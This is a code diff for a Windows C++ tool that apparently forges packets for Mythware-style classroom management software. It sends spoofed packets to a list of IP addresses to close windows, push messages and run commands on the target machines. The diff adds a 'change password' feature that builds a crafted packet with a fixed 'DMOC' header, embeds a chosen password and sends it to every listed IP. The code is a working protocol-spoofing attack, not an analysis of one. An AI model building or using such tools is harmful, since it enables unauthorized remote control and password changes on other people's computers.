@@ -23,6 +23,7 @@
 #define ADDIP2 1022
 #define CLRIP 1023
 #define DELIP 1024
+#define CHANGE_PASSWORD 2001
 
 #pragma comment(lib,"ws2_32.lib")
 using namespace std;
@@ -46,6 +47,7 @@ INT_PTR CALLBACK AddIPDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lPar
 INT_PTR CALLBACK AddMultipleIPDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
 INT_PTR CALLBACK SendMsgDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
 INT_PTR CALLBACK SendCmdDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
+INT_PTR CALLBACK ChangePasswordDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
 
 bool CheckIP(const std::string& ip);
 bool CheckIPf(const std::string& ip);
@@ -56,6 +58,7 @@ void EnableMenus(bool flag);
 //反控全部函数
 void sendPacket(const wstring& targetIP, const string& hexData);
 string generateHead();
+string generateHead_pw();
 void closeWindow(const wstring& targetIP);
 string wstringToHex(const wstring& wstr);
 void send_myth_Message(const wstring& targetIP, const wstring& msg);
@@ -63,7 +66,7 @@ string strToHex(const string& cmd);
 
 vector<wstring> ipList; // 存储IP地址的列表
 
-HWND hCloseWindow, hSendMessage, hSendCommand;
+HWND hCloseWindow, hSendMessage, hSendCommand, hChangePassword;
 
 // Helper: 将宽字符转换为 UTF-8 std::string，替代 CW2A
 static string WideCharToUtf8(const wchar_t* wstr)
@@ -178,6 +181,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
    HWND AddIP2 = CreateWindowW(L"BUTTON", L"添加多个ip", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 270, 240, 100, 25, hWnd, (HMENU)ADDIP2, hInstance, nullptr);
    HWND DelIP = CreateWindowW(L"BUTTON", L"删除选中ip", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 270, 280, 100, 25, hWnd, (HMENU)DELIP, hInstance, nullptr);
    HWND ClrIP = CreateWindowW(L"BUTTON", L"清空所有ip", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 270, 320, 100, 25, hWnd, (HMENU)CLRIP, hInstance, nullptr);
+   HWND ChangePassword = CreateWindowW(L"BUTTON", L"修改密码", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 50, 125, 100, 25, hWnd, (HMENU)CHANGE_PASSWORD, hInstance, nullptr);
 
    //IP列表
    HWND IPListBox = CreateWindowW(L"LISTBOX", NULL,
@@ -196,6 +200,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
     SendMessage(AddIP2, WM_SETFONT, (WPARAM)hFont, TRUE);
     SendMessage(DelIP, WM_SETFONT, (WPARAM)hFont, TRUE);
     SendMessage(ClrIP, WM_SETFONT, (WPARAM)hFont, TRUE);
+    SendMessage(ChangePassword, WM_SETFONT, (WPARAM)hFont, TRUE);
     SendMessage(IPListBox, WM_SETFONT, (WPARAM)hFont, TRUE);
     SendMessage(hStatic, WM_SETFONT, (WPARAM)hFont, TRUE);
 
@@ -203,6 +208,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
     hCloseWindow = close_Window;
     hSendMessage = sendMessage;
     hSendCommand = sendCommand;
+	hChangePassword = ChangePassword;
 
    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);
@@ -280,6 +286,11 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
                 DialogBox(hInst, MAKEINTRESOURCE(SENDCMD_WIN), hWnd, SendCmdDialog);
                 break;
             }
+			case CHANGE_PASSWORD:
+			{
+				DialogBox(hInst, MAKEINTRESOURCE(CHANGEPASSWORD_WIN), hWnd, ChangePasswordDialog);
+				break;
+			}
             default:
                 return DefWindowProc(hWnd, message, wParam, lParam);
             }
@@ -342,11 +353,13 @@ void EnableMenus(bool flag) {
         EnableWindow(hCloseWindow, TRUE);
         EnableWindow(hSendMessage, TRUE);
         EnableWindow(hSendCommand, TRUE);
+        EnableWindow(hChangePassword, TRUE);
     }
     else {
         EnableWindow(hCloseWindow, FALSE);
         EnableWindow(hSendMessage, FALSE);
         EnableWindow(hSendCommand, FALSE);
+        EnableWindow(hChangePassword, FALSE);
     }
 }
 
@@ -449,6 +462,19 @@ string generateHead() {
         to_string(dis(gen)) + to_string(dis(gen)) +
         "0000" +
         to_string(dis(gen)) + to_string(dis(gen)) + to_string(dis(gen));
+}
+
+string generateHead_pw() {
+    string rs;
+	rs += "444d4f430000010095000000";
+	for (int i = 1; i <= 16; i++) {
+		rs += to_string(dis(gen));
+	}
+	/*return "444d4f430000010095000000" +
+		to_string(dis(gen)) + to_string(dis(gen)) +
+		"0000" +
+		to_string(dis(gen)) + to_string(dis(gen)) + to_string(dis(gen));*/
+	return rs;
 }
 
 // 关闭窗口函数
@@ -701,6 +727,52 @@ INT_PTR CALLBACK SendCmdDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
             while (MsgHex.length() < 2076) {
                 MsgHex += "00";
             }
+			for (const auto& ip : ipList) {
+				sendPacket(ip, MsgHex);
+			}
+            MessageBoxW(hDlg, L"发送完成，可到logs.txt查看日志", L"提示", MB_ICONINFORMATION);
+			EndDialog(hDlg, LOWORD(wParam));
+			return (INT_PTR)TRUE;
+		}
+		}
+	}
+	}
+	return (INT_PTR)FALSE;
+}
+
+INT_PTR CALLBACK ChangePasswordDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
+    UNREFERENCED_PARAMETER(lParam);
+    switch (message) {
+    case WM_INITDIALOG: {
+        // 限制编辑框最多 1024 个字符
+        SendDlgItemMessage(hDlg, CHANGEPASSWORD_WIN_EDIT, EM_SETLIMITTEXT, 1024, 0);
+        return (INT_PTR)TRUE;
+    }
+    case WM_COMMAND: {
+        switch (LOWORD(wParam)) {
+        case CHANGEPASSWORD_WIN_CANCEL: {
+            EndDialog(hDlg, LOWORD(wParam));
+            return (INT_PTR)TRUE;
+        }
+        case CHANGEPASSWORD_WIN_OK: {
+            if (!ipList.size()) {
+                MessageBoxW(hDlg, L"请先添加IP地址", L"提示", MB_ICONINFORMATION);
+                return (INT_PTR)FALSE;
+            }
+            wchar_t passwordBuffer[1025];
+            GetDlgItemText(hDlg, CHANGEPASSWORD_WIN_EDIT, passwordBuffer, 1025);
+			if (passwordBuffer[0] == L'\0') {
+				MessageBoxW(hDlg, L"密码字段不能为空！", L"提示", MB_ICONINFORMATION);
+				return (INT_PTR)FALSE;
+			}
+            wstring newPassword(passwordBuffer);
+            string hexPassword = wstringToHex(newPassword);
+            string head = generateHead_pw();
+            string MsgHex = head + "204e0000c0a8be0188000000880000000040000000000000060000007b00000000000000010000000a000000000000000000000000000000500000005000000001000000" + hexPassword;
+			while (MsgHex.length() < 325) {
+				MsgHex += "0";
+			}
+            MsgHex += "20000000200000002000000000000";
 			for (const auto& ip : ipList) {
 				sendPacket(ip, MsgHex);
 			}
